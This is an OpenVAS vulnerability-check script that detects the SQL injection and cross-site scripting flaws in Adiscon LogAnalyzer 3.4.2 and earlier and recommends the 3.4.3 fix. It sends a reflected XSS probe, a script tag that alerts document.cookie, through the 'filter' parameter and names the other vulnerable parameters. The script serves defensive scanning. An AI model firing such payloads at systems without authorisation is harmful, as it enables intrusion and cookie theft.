##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_loganalyzer_sql_inj_n_xss_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# Adiscon LogAnalyzer Multiple SQL Injection and XSS Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902840");
  script_version("$Revision: 11857 $");
  script_bugtraq_id(53664);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-05-28 15:15:15 +0530 (Mon, 28 May 2012)");
  script_name("Adiscon LogAnalyzer Multiple SQL Injection and XSS Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49223");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113037/CSA-12005.txt");
  script_xref(name:"URL", value:"http://www.codseq.it/advisories/multiple_vulnerabilities_in_loganalyzer");
  script_xref(name:"URL", value:"http://loganalyzer.adiscon.com/news/loganalyzer-v3-4-3-v3-stable-released");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal cookie based
  authentication credentials, compromise the application, access or modify
  data or  exploit latent vulnerabilities in the underlying database.");
  script_tag(name:"affected", value:"Adiscon LogAnalyzer version 3.4.2 and prior");
  script_tag(name:"insight", value:"Multiple flaws are due to

  - Input passed via the 'filter' parameter to index.php, the 'id' parameter to
    admin/reports.php and admin/searches.php is not properly sanitised before
    being returned to the user.

  - Input passed via the 'Columns[]' parameter to admin/views.php is not
    properly sanitised before being used in SQL queries.");
  script_tag(name:"solution", value:"Upgrade to Adiscon LogAnalyzer version 3.4.3 or later.");
  script_tag(name:"summary", value:"This host is running Adiscon LogAnalyzer and is prone to multiple
  SQL injection and cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/loganalyzer", "/log", cgi_dirs(port:port)))
{
  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( isnull( res ) ) continue;

  if( res =~ "HTTP/1.. 200" && ">Adiscon LogAnalyzer<" >< res ) {

    url += "?filter=</title><script>alert(document.cookie)</script>";

    if(http_vuln_check( port: port, url: url, check_header: TRUE,
                        pattern: "<script>alert\(document\.cookie\)</script>",
                        extra_check: ">Adiscon LogAnalyzer<"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);